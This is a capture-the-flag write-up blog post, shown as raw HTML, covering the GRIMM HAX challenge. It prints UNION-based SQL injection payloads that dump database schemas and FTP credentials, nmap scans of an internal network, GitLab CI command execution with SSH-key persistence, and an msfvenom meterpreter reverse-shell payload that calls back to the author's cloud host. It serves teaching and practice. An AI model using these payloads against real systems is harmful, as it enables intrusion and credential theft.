@@ -1,0 +1,950 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+   
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="google-site-verification" content="YvLRi76QLISdw5rag4dXqmRRYvw91no7guPZf0-a6FY" />
+    <meta property="og:title" content=" GRIMM HAX Combined Challenge &middot;  Simple Guy" />
+    <meta property="og:site_name" content="Simple Guy" />
+    <meta property="og:url" content="https://simpleguy.tech/post/grimm-hax-combined-challenge/" />
+
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content="2018-05-22T15:08:38-04:00" />
+    
+
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@flyingpassword" />
+    <meta name="twitter:creator" content="@flyingpassword" />
+    <meta name="twitter:title" content="GRIMM HAX Combined Challenge" />
+    
+    <meta name="twitter:description" content="GRIMM HAX Combined Challenge Welcome, Bobby (100pts) Accessing the website at http://www.haxcorp.grimm-co.com/, we are provided with a login page with username as password. The objective of this level is to login as admin. Seeing this as a warmup level, I immediately try the following classic SQL injection
+And we are in. The flag is GRIMM-BOBBY-TABLES-WOULD-BE-PROUD.
+Oh How the Tables have Turned (100pts) From the description of the challenge, I predicted that this is another SQL injection to find the flag in a different table in the database, especially when we are presented with a search functionality." />
+    <meta name="twitter:url" content="https://simpleguy.tech/post/grimm-hax-combined-challenge/" />
+    
+
+    <title> GRIMM HAX Combined Challenge &middot;  Simple Guy</title>
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <link rel="preload" href="/js/main.js" as="script" />
+    <link rel="preload" href="/css/main.css" as="style" />
+    
+    
+
+
+    
+    <meta name="description" content="I&#39;m a simple guy." />
+    
+
+    
+    <meta name="p:domain_verify" content=""/>
+    
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    
+    
+
+    
+    <link href="https://simpleguy.tech/index.xml" rel="alternate" type="application/rss+xml" title="Simple Guy" />
+    
+
+    
+    <link rel="canonical" href="https://simpleguy.tech/post/grimm-hax-combined-challenge/" />
+
+    
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://simpleguy.tech/post/grimm-hax-combined-challenge/"
+        },
+        "headline": "GRIMM HAX Combined Challenge",
+        "description": "",
+        "author": {
+            "@type": "Person",
+            "name": "Duc Phan",
+            "url": "http://profiles.google.com/?rel=author",
+            "image": {
+              "@type": "ImageObject",
+              "url": "https:",
+              "height": 80,
+              "width": 80
+            }
+        },
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://simpleguy.tech/",
+          "name": "Simple Guy",
+          "url": "https://simpleguy.tech/",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https:",
+            "height": 80,
+            "width": 80
+          }
+        },
+        
+        "image": {
+          "@type": "ImageObject",
+          "url": "",
+          "height": 80,
+          "width": 80
+        },
+        "datePublished": "2018-05-22",
+        "dateModified": "2018-05-22",
+        "wordCount": 4129,
+        
+    }
+    </script>
+    
+
+    
+    <script type="text/javascript">
+        
+        
+        var disqus_shortname = 'asimpleguy';
+        var disqus_identifier = 'https:\/\/simpleguy.tech\/post\/grimm-hax-combined-challenge\/';
+        var disqus_title = 'GRIMM HAX Combined Challenge';
+        var disqus_url = 'https:\/\/simpleguy.tech\/post\/grimm-hax-combined-challenge\/';
+        
+    </script>
+    
+
+    <script type="text/javascript">
+        var config = {
+            baseUrl: "https:\/\/simpleguy.tech\/"
+        };
+    </script>
+
+    <style>
+html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,figure,footer,header,main,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure{margin:1em 40px}a{background-color:transparent;-webkit-text-decoration-skip:objects}img{border-style:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:300;src:local("Merriweather Sans Light"),local(MerriweatherSans-Light),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowY_zIojJi0m4a5Z6tRh6itY.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:400;src:local("Merriweather Sans Regular"),local(MerriweatherSans-Regular),url(//fonts.gstatic.com/s/merriweathersans/v5/AKu1CjQ4qnV8MUltkAX3sL2aU247V0zTzydO4RoO9Ok.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:700;src:local("Merriweather Sans Bold"),local(MerriweatherSans-Bold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowQfd-b-I5PxxcmB4_-MNcqw.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:800;src:local("Merriweather Sans ExtraBold"),local(MerriweatherSans-ExtraBold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowWT7sFQ1Iz1BbpcuCPlgc9Q.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:300;src:local("Merriweather Sans Light Italic"),local(MerriweatherSans-LightItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVX9UU5BmOJGkLxUCVv5VXdc.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:400;src:local("Merriweather Sans Italic"),local(MerriweatherSans-Italic),url(//fonts.gstatic.com/s/merriweathersans/v5/3Mz4hOHzs2npRMG3B1ascf0KIgDhPIHb_R-SWdtqte8.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:700;src:local("Merriweather Sans Bold Italic"),local(MerriweatherSans-BoldItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVYM8pfYvjMoOxygpzLVILAs.woff) format("woff")}@font-face {font-family: 'Aldrich';font-style: normal;font-weight: 400;src: local('Aldrich Regular'), local('Aldrich-Regular'), url('//fonts.gstatic.com/s/aldrich/v8/j-NnyokbAnhXANS2iZ6Jew.woff2') format('woff2');unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;font-style:normal}[class^="icon-"]:before{font-family:"icons";font-style:normal;font-weight:400;speak:none;display:inline-block;text-decoration:inherit;width:1em;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.icon-arrow-right:before{content:'\e807'}.icon-rss:before{content:'\e808'}body{font:300 1em / 1.5em 'Merriweather Sans',sans-serif;color:#595B66}a{color:inherit;text-decoration:none;font-weight:400}h1,h2{text-rendering:optimizeLegibility;color:#1F2026}h2 a{font-weight:inherit}h1{font-size:2em;line-height:1em;margin:2em 0 -.5em}h2{font-size:1.75em;line-height:1.143em;margin:2.286em 0 -.571em}p{margin:2em auto}i{font-weight:400;font-style:italic;color:#363740}img{display:block;max-width:100%;height:auto;margin:2.5em auto}body{background:#fff}.inner{max-width:48em;margin:0 auto;padding:0 1em}#wrapper{position:relative;box-sizing:border-box;width:100%;min-height:100vh;padding-bottom:6em;background:#F2F3F5}#push{transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav{position:relative;background:#fff;z-index:70;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav:after{clear:both;content:'';display:table}#nav .nav-logo{float:left;height:2em;padding:1em;max-width:50%}#nav .nav-logo img{width:auto;max-width:none;height:2em;margin:0;border-radius:5px}#nav .nav-menu{float:right}#nav .nav-menu:after{clear:both;content:'';display:table}#nav .nav-menu a{display:block;width:1em;height:1em;line-height:1em;padding:1.5em;text-align:center;float:left}#nav .nav-menu a i:before{margin:auto}.overlay{display:none;position:fixed;left:0;top:0;width:100%;height:100%;z-index:80;display:none}.overlay:before{content:'';position:absolute;left:0;top:0;width:100%;height:100%;background:#1F2026;opacity:0;transform-style:preserve-3d}#header{position:relative;padding:4em 0}#header .inner{position:relative;z-index:2}#header .header-title{display:block;text-align:center}#header .header-name{font-family: Aldrich, sans-serif;font-weight:700;letter-spacing:-1px;display:block;line-height:1em;font-size:2em;text-decoration:none;color:#1F2026;padding:0;margin:0}#header.has-cover .header-name{color:#fff}#header .header-description{display:block;margin:1em auto 0;color:#9D9FA6;position:relative;font-weight:300}#header .header-description:after{content:'';position:absolute;height:1px;width:100px;margin-left:-50px;left:50%;top:-.5em;background:#D4D5D9}#header.has-cover .header-description{color:#fff}#header.has-cover .header-description:after{background:#fff}#header .header-cover{position:absolute;width:100%;height:100%;top:0;left:0;margin-top:-4em;padding:4em 0;background:no-repeat fixed center 100% / cover;z-index:1}#header .header-cover:before{content:'';position:absolute;width:100%;height:100%;left:0;top:0;background:rgba(0,0,0,0.2)}#header .header-cover:after{content:'';position:absolute;width:100%;left:0;bottom:0;border-bottom:4px solid #19A0D7}#footer{position:absolute;width:100%;left:0;bottom:0;font-size:.75em;line-height:1.334em;background:#1F2026;color:#737580;z-index:20;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#footer a{color:#9D9FA6;font-weight:400}#footer .credits{text-align:center;font-size:.75em;line-height:1.334em;padding:2.667em;overflow:auto}#footer .credits span{display:block}#footer .credits .credits-theme{float:left}#footer .credits .credits-software{float:right}.post{position:relative;z-index:20}.post .post-image{display:block;margin:0;padding:0}.post .post-image img{display:block;width:100%;height:auto;margin:0;padding:0}.post .post-meta{display:block;font-size:.75em;line-height:1.334em;font-weight:400;margin-bottom:1.334em}.post .post-title{position:relative;color:#000;font-size:2em;line-height:1.375em;font-weight:800;text-indent:-1px;margin:.25em 0 .75em}.post .post-title:before{content:'';position:absolute;left:0;bottom:-.334em;width:1em;margin-bottom:-2px;border-bottom:4px solid #19A0D7}.post .post-title a{text-decoration:none;color:inherit;font-weight:inherit}#post-index{position:relative;max-width:1200px;margin:0 auto 4em;padding:.5em;z-index:10}@keyframes fade{0%{transform:translate3d(0,3em,0);opacity:0}100%{transform:translate3d(0,0,0);opacity:1}}.post-list{position:relative}.post-list .post{float:left;width:33.3%;transform:translate3d(0,3em,0);transform-style:preserve-3d;opacity:0;animation:fade ease-out .5s forwards;animation-delay:1.4s}@media only screen and (max-width: 50em){.post-list .post{width:49.9%}}@media only screen and (max-width: 30em){.post-list .post{width:100%;float:none}}.post-list .post:nth-child(1){animation-delay:.1s}.post-list .post:nth-child(2){animation-delay:.2s}.post-list .post:nth-child(3){animation-delay:.3s}.post-list .post:nth-child(4){animation-delay:.4s}.post-list .post:nth-child(5){animation-delay:.5s}.post-list .post:nth-child(6){animation-delay:.6s}.post-list .post:nth-child(7){animation-delay:.7s}.post-list .post:nth-child(8){animation-delay:.8s}.post-list .post:nth-child(9){animation-delay:.9s}.post-list .post .inner{word-wrap:break-word;padding:2em;margin:.5em;max-width:none;background:#fff;box-sizing:border-box;transform:scale(1);transform-style:preserve-3d}@media only screen and (max-width: 50em){.post-list .post .inner{padding:1em}}.post-list .post .post-link{position:absolute;left:0;top:0;width:100%;height:100%;z-index:10}.post-list .post .post-image{position:relative;margin:-2em -2em 0;overflow:hidden;background:#19A0D7}@media only screen and (max-width: 50em){.post-list .post .post-image{margin:-1em -1em 0}}.post-list .post .post-image img{transform:scale(1);transform-style:preserve-3d;opacity:1}.post-list .post .post-image:after{content:'';position:absolute;left:-5%;bottom:-2.5em;width:110%;height:4em;background:#fff;border-top:4px solid #19A0D7;box-shadow:0 0 2em rgba(0,0,0,0.2);transform:rotate(5deg)}.post-list .post .post-title{font-size:1.5em;line-height:1.167em}.post-list .post .post-excerpt{margin:0}.post-list .post .post-more{display:block;margin-top:1.5em}.post-list .post .post-more a{display:inline-block;font-size:.875em;line-height:1.143em;font-weight:400;color:#363740}.post-list .post .post-more a i{color:#0e77a0}.pagination{min-height:3em;margin:4em auto 2em;padding:0;position:relative}.pagination .pagination-item{position:relative;display:block;height:3em;line-height:3em;padding:0 1em;text-align:center;text-decoration:none;font-weight:700;color:#363740;border:1px solid #19A0D7;border-radius:4em;z-index:60}.pagination .pagination-item i{position:relative}@media only screen and (max-width: 30em){.pagination .pagination-item{width:4em;height:4em;line-height:4em;margin-top:-.5em;padding:0!important}.pagination .pagination-item i{font-size:1.5em}.pagination .pagination-item>span{display:none}}.pagination .pagination-prev{float:right}.pagination .pagination-prev i{right:-.05em}.pagination .pagination-info{display:block;left:0;top:0;height:3em;line-height:3em;position:absolute;text-align:center;width:100%;z-index:50;color:#9D9FA6}#loader-wrapper{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000}#loader{display:block;position:relative;left:50%;top:50%;width:150px;height:150px;margin:-75px 0 0 -75px;border-radius:50%;border:3px solid transparent;border-top-color:#19A0D7;animation:spin 2s linear infinite}#loader:before{content:"";position:absolute;top:5px;left:5px;right:5px;bottom:5px;border-radius:50%;border:3px solid transparent;border-top-color:#0e77a0;animation:spin 3s linear infinite}#loader:after{content:"";position:absolute;top:15px;left:15px;right:15px;bottom:15px;border-radius:50%;border:3px solid transparent;border-top-color:#D4D5D9;animation:spin 1.5s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style>
+
+
+</head>
+<body class="home-template">
+<div id="loader-wrapper">
+    <div id="loader"></div>
+</div>
+<section id="wrapper" style="display: none;">
+    <div id="ajax-container">
+        <nav id="nav" class="nav">
+            <div class="nav-logo">
+                <a href="https://simpleguy.tech/">
+                    
+                    Simple Guy
+                    
+                </a>
+            </div>
+            <div id="main-menu" class="nav-menu">
+                
+                
+                    <a class="nav-social" target="_blank" href="https://twitter.com/flyingpassword" title="Simple Guy on Twitter"><i class="fa fa-twitter"></i></a>
+                
+                
+                    <a class="nav-social" target="_blank" href="https://linkedin.com/in/ducphanduy" title="Simple Guy on LinkedIn"><i class="fa fa-linkedin"></i></a>
+                
+                
+                <a class="nav-social" target="_blank" href="https://github.com/ducphanduyagentp" title="Simple Guy on GitHub"><i class="fa fa-github"></i></a>
+                
+                <a id="search-button" onclick="$('#search-form').toggle();" title="Search"><i class="fa fa-search"></i></a>
+                <form id="search-form" method="get" role="search" action="https://google.com/search">
+                    <input type="hidden" name="as_sitesearch" value="https://simpleguy.tech/">
+                    <input type="text" name="q" maxlength="255" placeholder="Search..." class="form-control">
+                    <input type="submit" value="Search">
+                </form>
+                
+                
+                
+                
+                <a id="main-menu-button" class="menu" data-action="menu" data-target="menu"
+                   title="Main Menu"><i class="fa fa-navicon"></i></a>
+                
+            </div>
+        </nav>
+
+
+<main class="content" role="main">
+    <article class="post">
+        <div class="inner">
+
+            <div id="push">
+
+                <header class="post-header">
+                
+                    <span class="post-meta">
+                        <span class="post-date">22 May 2018</span> <span class="reading-time">| <span class="estimated-reading-time">20 min.</span> (<span class="word-count">4129</span> words)</span></span>
+                    </span>
+                <div class="clear"></div>
+                
+                <h1 class="post-title">GRIMM HAX Combined Challenge</h1>
+              </header>
+
+              <section class="post-content">
+                
+                  
+
+<h1 id="grimm-hax-combined-challenge">GRIMM HAX Combined Challenge</h1>
+
+<h2 id="welcome-bobby-100pts">Welcome, Bobby (100pts)</h2>
+
+<p>Accessing the website at <a href="http://www.haxcorp.grimm-co.com/">http://www.haxcorp.grimm-co.com/</a>, we are provided with a login page with username as password. The objective of this level is to login as admin. Seeing this as a warmup level, I immediately try the following classic SQL injection</p>
+
+<p><img src="/img/GRIMM-hax-combined/1.png" alt="100-sql-injection" /></p>
+
+<p>And we are in. The flag is <code>GRIMM-BOBBY-TABLES-WOULD-BE-PROUD</code>.</p>
+
+<p><img src="/img/GRIMM-hax-combined/2.png" alt="100-logged-in" /></p>
+
+<h2 id="oh-how-the-tables-have-turned-100pts">Oh How the Tables have Turned (100pts)</h2>
+
+<p>From the description of the challenge, I predicted that this is another SQL injection to find the flag in a different table in the database, especially when we are presented with a search functionality. Testing out the searchbox with a single quote yielded an error.</p>
+
+<p><img src="/img/GRIMM-hax-combined/3.png" alt="100-sql-injection-2" /></p>
+
+<p>From this error, we acknowledge that this is a MySQL database. An attack that I could think of at that moment is to use UNION-based SQL injection to gradually figure out the structure of the database and find out where the flag is in the database. One reason of using this type of SQL-injection is because the number of selected columns might have been known from the result table in the application (3 in this case). In UNION-based SQL-injection, the number of columns selected in the queries has to be the same.</p>
+
+<p>First, let&rsquo;s try to figure out all the database existed in the MySQL instance by reading the information_schema database. This database contains many useful information about the instance itself and from there, we can figure out the structure of the database.</p>
+
+<pre><code>' UNION SELECT schema_name, 2, 3 from information_schema.schemata;#
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/4.PNG" alt="100-union-1" /></p>
+
+<p>The next step is to checkout all the table in interesting databases that we see from here. I am going to checkout the <code>GRIMM</code> database in this case.</p>
+
+<pre><code>' UNION SELECT table_name, table_schema, 3 from information_schema.tables WHERE table_schema = 'GRIMM';#
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/5.PNG" alt="100-union-2" /></p>
+
+<p>From this result, we can kinda know that the flag will be in the table <code>flags</code> from the database <code>GRIMM</code>. Let&rsquo;s checkout all the columns in that table.</p>
+
+<pre><code>' UNION SELECT table_name, column_name, 3 from information_schema.columns WHERE table_name = 'flags';#
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/6.PNG" alt="100-union-3" /></p>
+
+<p>There are 2 columns in this table namely <code>id</code> and <code>flag</code>. Let&rsquo;s select all the data in this table to obtain the flag.</p>
+
+<pre><code>' UNION SELECT id, flag, 1337 FROM GRIMM.flags;#
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/7.PNG" alt="100-union-4" /></p>
+
+<p>And the flag is <code>GRIMM-SQL-INJECT</code>.</p>
+
+<h2 id="protected-files-200pts">Protected Files (200pts)</h2>
+
+<p>This is the next level that we need to solve in order to progress. The objective is to get access to an FTP server to retrieve the VPN configuration as suggested by the hint from another challenge. Let&rsquo;s proceed using the same SQL-injection strategy as the last level. In this level, the <code>vsftpd</code> database is the target. The other FTP-related database <code>vsftp</code> is empty.</p>
+
+<pre><code>' UNION SELECT table_name, table_schema, 3 from information_schema.tables WHERE table_schema = 'vsftpd';#
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/8.PNG" alt="200-ftp-1" /></p>
+
+<pre><code>' UNION SELECT table_name, column_name, 3 from information_schema.columns WHERE table_name = 'accounts';#
+</code></pre>
+
+<p><img src="/img/GRIMM-hax-combined/9.PNG" alt="200-ftp-2" /></p>
+
+<p>Note that there are some column names that do not belong to the target <code>accounts</code> table because there are other tables of the same name in the database. However, this is good enough as we can see the interesting <code>username</code> and <code>pass</code> columns.</p>
+
+<p><img src="/img/GRIMM-hax-combined/10.PNG" alt="200-ftp-3" /></p>
+
+<p>Let&rsquo;s plug all the hashes into a website to crack them.</p>
+
+<p><img src="/img/GRIMM-hax-combined/11.PNG" alt="200-ftp-4" /></p>
+
+<p>Let&rsquo;s connect to the FTP server on the same host and try to login with the visible creds.</p>
+
+<p><img src="/img/GRIMM-hax-combined/12.PNG" alt="200-ftp-5" /></p>
+
+<p>This is the VPN configuration to connects to the internal infrastructure. The flag is in <code>management.ovpn</code></p>
+
+<p><img src="/img/GRIMM-hax-combined/13.PNG" alt="200-ftp-6" /></p>
+
+<p>The flag is <code>GRIMM-PEEKIN-IN-YO-NETWORK</code>.</p>
+
+<h2 id="enumeration-of-the-internal-infrastructure">Enumeration of the internal infrastructure</h2>
+
+<p>From this level and on, we need to connect to the internal infrastructure using the obtained VPN configuration.</p>
+
+<pre><code>openvpn --config management.ovpn
+</code></pre>
+
+<p>After connected to the internal network, let&rsquo;s take a look at some network information to get to know the subnets in the scope. From the output of OpenVPN, I noticed some subnets:</p>
+
+<pre><code>Fri May 25 22:39:11 2018 /sbin/ip addr add dev tun0 local 10.8.0.10 peer 10.8.0.9
+Fri May 25 22:39:11 2018 /sbin/ip route add 10.123.14.0/24 via 10.8.0.9
+Fri May 25 22:39:11 2018 /sbin/ip route add 10.123.15.0/24 via 10.8.0.9
+Fri May 25 22:39:11 2018 /sbin/ip route add 10.8.0.1/32 via 10.8.0.9
+</code></pre>
+
+<p>The client machine is on the 10.8.0.0 network so I assumed that the target networks are <code>10.123.14.0/24</code> and <code>10.123.15.0/24</code>. Let&rsquo;s have an initial enumeration of those network using a ping scan. Note that there might have been non-pingable machines at this point.</p>
+
+<pre><code>➜  grimm git:(master) ✗ nmap -sn 10.123.14.0/24 
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:43 EDT
+Nmap scan report for 10.123.14.10
+Host is up (0.072s latency).
+Nmap scan report for 10.123.14.12
+Host is up (0.042s latency).
+Nmap scan report for 10.123.14.122
+Host is up (0.044s latency).
+Nmap done: 256 IP addresses (3 hosts up) scanned in 7.63 seconds
+➜  grimm git:(master) ✗ nmap -sn 10.123.15.0/24  
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:43 EDT
+Nmap scan report for 10.123.15.10
+Host is up (0.044s latency).
+Nmap scan report for 10.123.15.15
+Host is up (0.063s latency).
+Nmap scan report for 10.123.15.20
+Host is up (0.039s latency).
+Nmap scan report for 10.123.15.53
+Host is up (0.040s latency).
+Nmap done: 256 IP addresses (4 hosts up) scanned in 5.08 seconds
+</code></pre>
+
+<p>Let&rsquo;s next scan the common ports on those hosts.</p>
+
+<pre><code>➜  grimm git:(master) ✗ nmap -v -sV -iL hosts.txt   
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:47 EDT
+NSE: Loaded 42 scripts for scanning.
+Initiating Ping Scan at 22:47
+Scanning 7 hosts [4 ports/host]
+Completed Ping Scan at 22:47, 0.08s elapsed (7 total hosts)
+Initiating Parallel DNS resolution of 7 hosts. at 22:47
+Completed Parallel DNS resolution of 7 hosts. at 22:47, 0.03s elapsed
+Initiating SYN Stealth Scan at 22:47
+Scanning 7 hosts [1000 ports/host]
+Discovered open port 3389/tcp on 10.123.15.10
+Discovered open port 22/tcp on 10.123.14.12
+Discovered open port 139/tcp on 10.123.15.10
+Discovered open port 445/tcp on 10.123.15.10
+Discovered open port 135/tcp on 10.123.15.10
+Discovered open port 80/tcp on 10.123.14.10
+Discovered open port 53/tcp on 10.123.15.10
+Discovered open port 593/tcp on 10.123.15.10
+Discovered open port 636/tcp on 10.123.15.10
+Discovered open port 3269/tcp on 10.123.15.10
+Discovered open port 389/tcp on 10.123.15.10
+Discovered open port 464/tcp on 10.123.15.10
+Discovered open port 88/tcp on 10.123.15.10
+Discovered open port 3268/tcp on 10.123.15.10
+Completed SYN Stealth Scan against 10.123.15.10 in 24.85s (6 hosts left)
+Completed SYN Stealth Scan against 10.123.14.12 in 25.23s (5 hosts left)
+Completed SYN Stealth Scan against 10.123.14.122 in 25.44s (4 hosts left)
+Completed SYN Stealth Scan against 10.123.14.10 in 25.49s (3 hosts left)
+Completed SYN Stealth Scan against 10.123.15.15 in 25.63s (2 hosts left)
+Completed SYN Stealth Scan against 10.123.15.20 in 25.72s (1 host left)
+Completed SYN Stealth Scan at 22:48, 25.82s elapsed (7000 total ports)
+Initiating Service scan at 22:48
+Scanning 14 services on 7 hosts
+Completed Service scan at 22:48, 11.17s elapsed (14 services on 7 hosts)
+NSE: Script scanning 7 hosts.
+Initiating NSE at 22:48
+Completed NSE at 22:48, 0.38s elapsed
+Initiating NSE at 22:48
+Completed NSE at 22:48, 0.18s elapsed
+Nmap scan report for 10.123.15.10
+Host is up (0.042s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Microsoft DNS
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-05-26 02:48:53Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.hax, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: CORP)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.hax, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 10.123.15.15
+Host is up (0.042s latency).
+All 1000 scanned ports on 10.123.15.15 are filtered
+
+Nmap scan report for 10.123.15.20
+Host is up (0.043s latency).
+All 1000 scanned ports on 10.123.15.20 are filtered
+
+Nmap scan report for 10.123.15.53
+Host is up (0.043s latency).
+All 1000 scanned ports on 10.123.15.53 are filtered
+
+Nmap scan report for 10.123.14.10
+Host is up (0.044s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx
+
+Nmap scan report for 10.123.14.12
+Host is up (0.041s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 10.123.14.122
+Host is up (0.043s latency).
+All 1000 scanned ports on 10.123.14.122 are filtered
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 7 IP addresses (7 hosts up) scanned in 38.71 seconds
+           Raw packets sent: 14052 (618.172KB) | Rcvd: 74 (3.144KB)
+</code></pre>
+
+<h2 id="git-your-daily-news-100pts">Git Your Daily News (100pts)</h2>
+
+<p>From the initial enumeration result, I tried to access the web server on <code>10.123.14.10</code> and fortunately it is the GitLab server that I needed to find. The flag is <code>GRIMM-GIT-GUD-SUN</code>.</p>
+
+<p><img src="/img/GRIMM-hax-combined/14.PNG" alt="git-1" /></p>
+
+<h2 id="pipeline-300pts">Pipeline (300pts)</h2>
+
+<p>To access gitlab, register and login. I was a little bit lucky at this level because I was doing a class-project at the same time which involved continuous integration using Travis-CI, I knew that I need to somehow achieve code execution using continuous integration that comes with Gitlab. From <a href="https://docs.gitlab.com/ee/ci/quick_start/README.html">this documentation</a> from Gitlab, I created a project and commit a <code>.gitlab-ci.yml</code> file to execute command on the gitlab machine:</p>
+
+<pre><code>job1:
+    script: &quot;ls -la&quot;
+</code></pre>
+
+<p>After committing the new file, the job defined in this configuration file was automatically run.</p>
+
+<p><img src="/img/GRIMM-hax-combined/15.PNG" alt="gitlab-1" /></p>
+
+<p>After testing out several commands for a while, I proceeded to obtaining an SSH-shell on the remote host by adding a bash script that writes my public key to ~/.ssh/authorized_keys. And there is our shell:</p>
+
+<p><img src="/img/GRIMM-hax-combined/16.PNG" alt="gitlab-2" />
+<img src="/img/GRIMM-hax-combined/17.PNG" alt="gitlab-3" /></p>
+
+<p>The flag is <code>GRIMM-CONTINUOUS-PWNTEGRATION</code>. Note that the flag can be obtained just from using the configuration file to traverse the file system. However, I wanted to take this further so that I could explore the system more easily.</p>
+
+<p>To make persistent and pivoting easier, I started a meterpreter shell on this machine and manage it using metasploit running on an AWS EC2 instance.</p>
+
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;public-ip&gt; LPORT=4444 -f elf &gt; fpasswdpwn
+</code></pre>
+
+<h2 id="lister-400pts">Lister (400pts)</h2>
+
+<p>This is definitely my favorite part of the challenge. Let&rsquo;s first play with the binary a little bit to see what it was doing.</p>
+
+<h3 id="discovery">Discovery</h3>
+
+<p>Running the binary did not give any output.</p>
+
+<p><img src="/img/GRIMM-hax-combined/35.PNG" alt="lister-1" /></p>
+
+<p>Having done some CTFs that have this kind of binary, I was sure that it was running as a service listening for incoming connection. That was actually the case because we are trying to access a particular service on a remote machine. I did a <code>netstat</code> command to figure out on which port it was listening. It was port <code>12345</code>.</p>
+
+<p><img src="/img/GRIMM-hax-combined/36.PNG" alt="lister-2" /></p>
+
+<p>Connecting to the service using <code>nc</code>, we are prompted with a file listing program.</p>
+
+<p><img src="/img/GRIMM-hax-combined/37.PNG" alt="lister-3" /></p>
+
+<p>After that, I figured out the service was running on <code>10.123.15.53</code> by doing a connect scan from the gitlab-runner machine on the networks. The following asciinema record is me playing with the remote service. I did an SSH-portforward to get the service on <code>localhost:1234</code>.</p>
+
+<script src="https://asciinema.org/a/184103.js" id="asciicast-184103" async></script>
+
+<p>As you can see, the service did not work as intended all the time and sometime it would eat up the last character from the input (0:30). Let&rsquo;s do some more work on the binary to figure out why that happenned.</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Let&rsquo;s checkout the protection mechanisms of the binary to figure out possible approaches. I was using the <code>checksec</code> command comes with <code>pwntools</code>.</p>
+
+<pre><code>➜  grimm git:(master) ✗ file lister
+lister: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.35, BuildID[sha1]=61ef9b28e166ee62f7241d920a1058974241d61b, not stripped
+➜  grimm git:(master) ✗ checksec lister
+[*] '/root/someWorkspace/workspace/ctfs/2018/grimm/grimm/lister'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+
